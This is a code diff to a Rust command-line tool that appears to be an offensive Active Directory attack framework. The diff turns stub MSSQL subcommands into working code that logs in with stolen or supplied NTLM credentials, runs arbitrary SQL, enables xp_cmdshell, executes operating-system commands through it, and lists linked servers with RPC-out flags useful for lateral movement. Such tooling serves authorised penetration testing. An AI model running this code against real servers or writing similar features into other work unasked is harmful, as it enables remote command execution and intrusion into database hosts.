@@ -1302,7 +1302,7 @@ async fn async_main() {
             ref target,
             ref shell_type,
         } => commands_impl::cmd_shell(target, shell_type).await,
-        Commands::Sccm { ref action } => commands_impl::cmd_sccm(action).await,
+        Commands::Sccm { ref action } => commands_impl::cmd_sccm(&cli, action).await,
         Commands::Scan {
             ref targets,
             ref ports,
@@ -2883,10 +2883,23 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
 
 // cmd_mssql
 async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
+    use overthrone_core::mssql::{MssqlClient, MssqlConfig};
+
     banner::print_module_banner("MSSQL");
-    let _creds = match require_creds(cli) {
+    let creds = match require_creds(cli) {
         Ok(c) => c,
         Err(e) => return e,
+    };
+
+    let password = match creds.password() {
+        Some(p) => p.to_string(),
+        None => {
+            banner::print_fail(
+                "MSSQL TDS authentication requires a plaintext password; \
+                NT hash and Kerberos ticket auth are not supported over TDS",
+            );
+            return 1;
+        }
     };
 
     match action {
@@ -2896,46 +2909,190 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
             database,
         } => {
             println!(
-                "{} Executing query on: {}",
+                "{} Querying {} — database: {} — sql: {}",
                 "🗄".bright_black(),
-                target.cyan()
+                target.cyan(),
+                database.cyan(),
+                query.yellow()
             );
-            println!("{} Database: {}", "📁".bright_black(), database.cyan());
-            println!("{} Query: {}", "📝".bright_black(), query.yellow());
-            banner::print_success("Query executed");
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database(&database);
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                    return 1;
+                }
+            };
+            match client.query(&query).await {
+                Ok(result) => {
+                    if result.columns.is_empty() {
+                        banner::print_info("Query returned no columns");
+                    } else {
+                        let header = result.columns.join(" | ");
+                        println!("{}", header.bold());
+                        println!("{}", "-".repeat(header.len()));
+                        for row in &result.rows {
+                            let vals: Vec<&str> =
+                                row.iter().map(|v| v.as_deref().unwrap_or("NULL")).collect();
+                            println!("{}", vals.join(" | "));
+                        }
+                        banner::print_success(&format!("{} row(s) returned", result.rows.len()));
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Query failed: {}", e));
+                    let _ = client.close().await;
+                    return 1;
+                }
+            }
+            let _ = client.close().await;
         }
         MssqlAction::XpCmdShell { target, command } => {
             println!(
-                "{} Executing xp_cmdshell on: {}",
+                "{} Executing xp_cmdshell on {} — command: {}",
                 "⚡".bright_black(),
-                target.cyan()
+                target.cyan(),
+                command.yellow()
             );
-            println!("{} Command: {}", "💻".bright_black(), command.yellow());
-            banner::print_success("Command executed");
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database("master");
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                    return 1;
+                }
+            };
+            match client.execute_xp_cmdshell(&command).await {
+                Ok(output) => {
+                    if output.is_empty() {
+                        banner::print_info("Command produced no output");
+                    } else {
+                        println!("{}", output);
+                    }
+                    banner::print_success("xp_cmdshell executed");
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("xp_cmdshell failed: {}", e));
+                    let _ = client.close().await;
+                    return 1;
+                }
+            }
+            let _ = client.close().await;
         }
         MssqlAction::LinkedServers { target } => {
             println!(
-                "{} Enumerating linked servers on: {}",
+                "{} Enumerating linked servers on {}",
                 "🔗".bright_black(),
                 target.cyan()
             );
-            banner::print_success("Linked servers enumerated");
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database("master");
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                    return 1;
+                }
+            };
+            match client.enumerate_linked_servers().await {
+                Ok(servers) => {
+                    if servers.is_empty() {
+                        banner::print_info("No linked servers found");
+                    } else {
+                        for srv in &servers {
+                            print!(
+                                "  {} {} | source: {} | provider: {}",
+                                "→".cyan(),
+                                srv.name.bold(),
+                                srv.data_source.yellow(),
+                                srv.provider.bright_black()
+                            );
+                            if srv.rpc_out_enabled {
+                                print!("  [RPC-out]");
+                            }
+                            if srv.data_access_enabled {
+                                print!("  [data-access]");
+                            }
+                            println!();
+                        }
+                        banner::print_success(&format!(
+                            "{} linked server(s) found",
+                            servers.len()
+                        ));
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Linked server enumeration failed: {}", e));
+                    let _ = client.close().await;
+                    return 1;
+                }
+            }
+            let _ = client.close().await;
         }
         MssqlAction::EnableXpCmdShell { target } => {
             println!(
-                "{} Enabling xp_cmdshell on: {}",
+                "{} Enabling xp_cmdshell on {}",
                 "🔓".bright_black(),
                 target.cyan()
             );
-            banner::print_success("xp_cmdshell enabled");
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database("master");
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                    return 1;
+                }
+            };
+            match client.enable_xp_cmdshell().await {
+                Ok(()) => {
+                    banner::print_success("xp_cmdshell enabled successfully");
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to enable xp_cmdshell: {}", e));
+                    let _ = client.close().await;
+                    return 1;
+                }
+            }
+            let _ = client.close().await;
         }
         MssqlAction::CheckXpCmdShell { target } => {
             println!(
-                "{} Checking xp_cmdshell status on: {}",
+                "{} Checking xp_cmdshell status on {}",
                 "🔍".bright_black(),
                 target.cyan()
             );
-            banner::print_success("xp_cmdshell status checked");
+            let config = MssqlConfig::new(&target)
+                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_database("master");
+            let mut client = match MssqlClient::connect(config).await {
+                Ok(c) => c,
+                Err(e) => {
+                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
+                    return 1;
+                }
+            };
+            match client.check_xp_cmdshell().await {
+                Ok(enabled) => {
+                    if enabled {
+                        banner::print_success("xp_cmdshell is ENABLED");
+                    } else {
+                        banner::print_info("xp_cmdshell is DISABLED");
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Status check failed: {}", e));
+                    let _ = client.close().await;
+                    return 1;
+                }
+            }
+            let _ = client.close().await;
         }
     }
     0
